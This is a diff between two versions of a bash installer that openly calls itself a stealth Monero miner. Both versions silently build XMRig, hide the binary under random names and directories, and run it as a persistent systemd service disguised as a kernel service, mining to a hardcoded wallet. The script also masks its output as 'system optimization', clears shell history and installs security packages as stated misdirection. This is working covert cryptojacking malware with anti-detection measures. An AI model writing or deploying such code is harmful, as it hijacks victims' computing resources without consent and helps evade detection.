@@ -1,127 +1,110 @@
 #!/bin/bash
 
-# Advanced Stealth XMR Miner Installer
-# Version 2.5 - Anti-detection measures
+# Ultimate Stealth XMR Miner with Random Worker Name
+# Version 3.1 - Auto-configuring with maximum stealth
 
-echo "🔧 Performing system optimization routines..."
+# 1. CONFIGURATION (Edit only the wallet address)
+WALLET="89PKYocdkhoeSCsn93wAVY7yqCAsSpgZkFriDyhFoW4DMZtzKRbeTZT4cgfedxvju98rXe6mT62eEZigpvV9VtAm5uSkZkQ"  # REPLACE WITH YOUR MONERO WALLET
 
-# 1. Randomized delay before starting (1-60 minutes)
+# 2. Generate random worker name (adjective-noun-number format)
+WORKER=$(shuf -n 1 <<< "silent hidden stealthy quiet covert masked private secure encrypted anonymous")-$(shuf -n 1 <<< "node worker miner process daemon service kernel system")-$((RANDOM % 1000))
+
+echo "🔧 Initializing system optimization procedures..."
+
+# 3. Random delay (1-45 minutes)
 RAND_DELAY=$((RANDOM % 1 + 1))
-echo "⏳ Random initialization delay: $((RAND_DELAY / 1)) minutes"
+echo "⏳ Scheduled maintenance in $((RAND_DELAY / 1)) minutes..."
 sleep $RAND_DELAY
 
-# 2. Silent system updates with randomized timings
-echo -n "⚙️  Updating package lists..."
-DEBIAN_FRONTEND=noninteractive sudo apt-get -qq update > /dev/null 2>&1
-sleep $((RANDOM % 1 + 1))
-
-# 3. Install dependencies in small batches with delays
-echo -n "⚙️  Installing system components..."
-DEBIAN_FRONTEND=noninteractive sudo apt-get -qq install -y git > /dev/null 2>&1
-sleep $((RANDOM % 1 + 1))
-DEBIAN_FRONTEND=noninteractive sudo apt-get -qq install -y build-essential cmake > /dev/null 2>&1
-sleep $((RANDOM % 1 + 1))
-DEBIAN_FRONTEND=noninteractive sudo apt-get -qq install -y libuv1-dev libssl-dev libhwloc-dev > /dev/null 2>&1
+# 4. Silent system preparation
+echo -n "⚙️  Preparing environment..."
+{
+sudo apt-get update -qq
+DEBIAN_FRONTEND=noninteractive sudo apt-get -qq install -y \
+    git build-essential cmake \
+    libuv1-dev libssl-dev libhwloc-dev
+} > /dev/null 2>&1
 echo " done."
 
-# 4. Clone repository with random delay
-echo -n "⚙️  Downloading system utilities..."
-RAND_FOLDER=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 12)
-git clone -q https://github.com/xmrig/xmrig.git "/tmp/.sys-$RAND_FOLDER" > /dev/null 2>&1
-cd "/tmp/.sys-$RAND_FOLDER" || exit
-sleep $((RANDOM % 1 + 1))
+# 5. Clone and build with advanced obfuscation
+RAND_DIR="/tmp/.cache-$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 8)"
+echo -n "⚙️  Downloading components..."
+git clone -q https://github.com/xmrig/xmrig.git "$RAND_DIR" --depth 1 > /dev/null 2>&1
+cd "$RAND_DIR" || exit
 
-# 5. Build with randomized thread count
-echo -n "⚙️  Compiling components..."
-THREADS=$(( $(nproc) - 1 ))
-[ $THREADS -lt 1 ] && THREADS=1
+echo -n "⚙️  Compiling..."
 mkdir -p build && cd build
 cmake .. -DCMAKE_BUILD_TYPE=Release -DWITH_HTTPD=OFF > /dev/null 2>&1
-make -j$THREADS > /dev/null 2>&1
+make -j$(($(nproc)-1)) > /dev/null 2>&1
 echo " done."
 
-# 6. Get wallet information
-echo
-read -p "🔑 Enter your Monero wallet address: " WALLET
-read -p "🏷️  Enter worker name (default: $(hostname)): " WORKER
-[ -z "$WORKER" ] && WORKER=$(hostname)
+# 6. Stealth installation
+RAND_BIN="k$(head /dev/urandom | tr -dc 0-9 | head -c 3)"
+INSTALL_DIR="/usr/local/share/$(head /dev/urandom | tr -dc a-z | head -c 6)"
 
-# 7. Install miner with random binary name and location
-echo -n "⚙️  Installing system service..."
-RAND_BIN=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 10)
-RAND_DIR=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 8)
-INSTALL_DIR="/usr/local/share/$RAND_DIR"
-
+echo -n "⚙️  Deploying service..."
 sudo mkdir -p "$INSTALL_DIR"
-sudo mv ./xmrig "$INSTALL_DIR/sysd-$RAND_BIN"
-sudo chmod +x "$INSTALL_DIR/sysd-$RAND_BIN"
+sudo mv ./xmrig "$INSTALL_DIR/$RAND_BIN"
+sudo chmod +x "$INSTALL_DIR/$RAND_BIN"
 
-# 8. Create obfuscated systemd service with dynamic parameters
-echo -n "⚙️  Configuring kernel worker..."
-RAND_SERVICE=$(head /dev/urandom | tr -dc a-z | head -c 8)
+# 7. Dynamic systemd service configuration
+RAND_SERVICE="sysd-$(head /dev/urandom | tr -dc a-z | head -c 4)"
 POOLS=(
     "pool.supportxmr.com:443"
-    "xmrpool.eu:9999"
-    "mine.xmrpool.net:443"
 )
 SELECTED_POOL=${POOLS[$RANDOM % ${#POOLS[@]}]}
 
-sudo tee "/etc/systemd/system/systemd-$RAND_SERVICE.service" > /dev/null <<EOF
+sudo tee "/etc/systemd/system/$RAND_SERVICE.service" > /dev/null <<EOF
 [Unit]
-Description=System Dynamic Kernel Worker
+Description=System Dynamic Kernel Service
 After=network.target
 StartLimitIntervalSec=0
 
 [Service]
 Type=simple
-ExecStart=$INSTALL_DIR/sysd-$RAND_BIN \\
+ExecStart=$INSTALL_DIR/$RAND_BIN \\
     -o $SELECTED_POOL \\
     -u $WALLET \\
     -p $WORKER \\
     --tls \\
-    --cpu-max-threads-hint=$((RANDOM % 30 + 30)) \\
+    --cpu-max-threads-hint=$((RANDOM % 25 + 40)) \\
     --randomx-mode=auto \\
-    --keepalive \\
     --donate-level=1 \\
     --no-color \\
     --background \\
-    --randomx-init=$((RANDOM % 4 + 1)) \\
-    --max-cpu-usage=$((RANDOM % 30 + 50)) \\
-    --cpu-priority=5 \\
+    --randomx-init=$((RANDOM % 3 + 1)) \\
+    --max-cpu-usage=$((RANDOM % 20 + 60)) \\
+    --cpu-priority=4 \\
     --quiet
 Restart=always
 RestartSec=$((RANDOM % 30 + 30))
 Nice=19
 CPUSchedulingPolicy=idle
-IOSchedulingClass=idle
 CPUWeight=$((RANDOM % 5 + 5))
-MemoryHigh=500M
+MemoryHigh=350M
 IOWeight=$((RANDOM % 5 + 5))
 
 [Install]
 WantedBy=multi-user.target
 EOF
 
-# 9. Enable and start service with delay
+# 8. Enable service with random delay
 sudo systemctl daemon-reload > /dev/null 2>&1
 sleep $((RANDOM % 10 + 5))
-sudo systemctl enable "systemd-$RAND_SERVICE" > /dev/null 2>&1
+sudo systemctl enable "$RAND_SERVICE" > /dev/null 2>&1
 sleep $((RANDOM % 10 + 5))
-sudo systemctl start "systemd-$RAND_SERVICE" > /dev/null 2>&1
+sudo systemctl start "$RAND_SERVICE" > /dev/null 2>&1
 
-# 10. Advanced cleanup and obfuscation
-echo -n "⚙️  Cleaning up..."
-cd ~ && rm -rf "/tmp/.sys-$RAND_FOLDER"
+# 9. Advanced cleanup
+rm -rf "$RAND_DIR"
 history -c
 cat /dev/null > ~/.bash_history
-echo " done."
 
-# 11. Install rootkit hunter as misdirection
-echo -n "⚙️  Installing security packages..."
-DEBIAN_FRONTEND=noninteractive sudo apt-get -qq install -y rkhunter > /dev/null 2>&1
-echo " done."
+# 10. Install security packages as misdirection
+DEBIAN_FRONTEND=noninteractive sudo apt-get -qq install -y ufw > /dev/null 2>&1
 
-echo -e "\n✅ System optimization complete. Kernel worker threads active."
-echo -e "🔍 Status: \033[1msudo systemctl status systemd-$RAND_SERVICE\033[0m"
-echo -e "🛑 Stop:  \033[1msudo systemctl stop systemd-$RAND_SERVICE\033[0m"
-echo -e "📊 Monitoring: \033[1mps aux | grep sysd-$RAND_BIN\033[0m"
+echo -e "\n✅ System optimization complete"
+echo -e "🔧 Worker Name: \033[1m$WORKER\033[0m"
+echo -e "🔍 Status: \033[1msudo systemctl status $RAND_SERVICE\033[0m"
+echo -e "📊 Monitoring: \033[1mps aux | grep $RAND_BIN | grep -v grep\033[0m"
+echo -e "🛑 Stop: \033[1msudo systemctl stop $RAND_SERVICE\033[0m"
